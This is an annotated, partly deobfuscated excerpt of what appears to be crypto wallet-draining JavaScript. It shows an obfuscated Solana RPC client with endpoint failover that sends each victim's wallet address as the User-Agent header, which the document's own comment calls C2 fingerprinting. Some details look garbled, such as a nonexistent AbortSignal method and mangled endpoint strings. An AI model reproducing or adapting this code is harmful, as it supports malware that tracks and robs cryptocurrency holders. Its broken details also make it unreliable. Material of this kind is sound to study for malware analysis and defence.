/* ════════════════════════════════════════════════════════════
 * SECTION 7 — SOLANA RPC CLIENT
 * See docs/execution_flow.md and docs/backend_protocol.md.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

  /* ═══════════════════════════════════════════════════════════
   * SECTION 7 — SOLANA RPC CLIENT
   * RpcClient: rotating RPC client with per-endpoint failover.
   * Endpoints: Helius x4 + publicnode + magiceden + solanatracker + mainnet-beta
   * solana.<method>(...args) → rpcClient.request(method, args) via Proxy
   * Request headers include User-Agent: walletAddress (C2 fingerprinting)
   * ═══════════════════════════════════════════════════════════ */
  RpcClient = class {
    constructor(_str_cache) {
      _noop(_initPriv(this, _rpc_ep_wm), _initPriv(this, _rpc_cnt_wm), _initPriv(this, _rpc_idx_wm, 0), _setPriv(this, _rpc_ep_wm, _str_cache), _setPriv(this, _rpc_cnt_wm, _str_cache["length"]))
    }
    async ["request"](_str_cache, __str_table__, _s1 = _getPriv(this, _rpc_cnt_wm)) {
      let _s3 = _getPriv(this, _rpc_idx_wm);
      let _s2 = _getPriv(this, _rpc_ep_wm)[_s3];
      let _s5 = await fetch(_s2, {
        ["method"]: "POST",
        ["headers"]: {
          ["User-Agent"]: walletAddress,
          ["content-type"]: getString(237),
          ["solana-client"]: getString(238)
        },
        ["body"]: JSON["stringify"]({
          ["jsonrpc"]: "2.0",
          ["id"]: 1,
          ["method"]: _str_cache,
          ["params"]: __str_table__
        }),
        ["signal"]: AbortSignal["Be"](2500)
      })["catch"](_limitArgs((..._str_cache) => {
        _str_cache["length"] = 1;
        return _str_cache[0]
      }));
      if (_s5 instanceof Error || !_s5["ok"] || _s5["headers"]["get"]("content-length") == "0") {
        if (_s1 > 0 && _getPriv(this, _rpc_cnt_wm) > 1) {
          return _setPriv(this, _rpc_idx_wm, (_s3 + 1) % _getPriv(this, _rpc_cnt_wm)), await this["request"](_str_cache, __str_table__, _s1 - 1)
        }
        let _s4 = _s5 instanceof Error ? _s5["message"] : "20";
        throw new HttpError(_s4)
      }
      let _s6 = await _s5["json"]();
      if ("error" in _s6) {
        let {
          ["code"]: _s4, ["message"]: _s7
        } = _s6["error"];
        throw new RpcError(_str_cache, _s4, _s7)
      }
      return typeof _s6["result"] == "object" && _s6["result"]?.context && cacheSlot_fn(_s6["result"]["context"]["slot"]), _s6["result"]
    }
  }, _rpc_ep_wm = new(WeakMap), _rpc_cnt_wm = new(WeakMap), _rpc_idx_wm = new(WeakMap), _rpc_base_url = getString(239), rpcEndpoints = [_rpc_base_url + getString(240), _rpc_base_url + "https://go.cb-w.com/dapp?cb_url=", _rpc_base_url + getString(242), _rpc_base_url + getString(243), "NmN3c3FCcW1SeTIyUWEyU0V1Wjh0V3JwS29DUzlNOFMycjhjdDhWdXFGbWo=", getString(245), getString(246), getString(247)], rpcClient = new RpcClient(rpcEndpoints), solana = new(Proxy)({}, {
    ["get"](..._str_cache) {
      _str_cache["length"] = 2;
      return (...__str_table__) => {
        return rpcClient["request"](_str_cache[1], __str_table__)
      }
    }
  }), rpcEndpointsShort = rpcEndpoints["slice"](0, -3), heliusEndpoints = new(Set)([getString(248), getString(249), getString(250), getString(251), getString(252), getString(253), getString(254), getString(255), getString(256), getString(257), getString(258), getString(259), getString(260), getString(261), getString(262), getString(263), getString(264), getString(265), getString(266), getString(267), getString(268), getString(269), getString(270), getString(271), getString(272), getString(273), getString(274), getString(275), getString(276)]), ls = window["localStorage"],
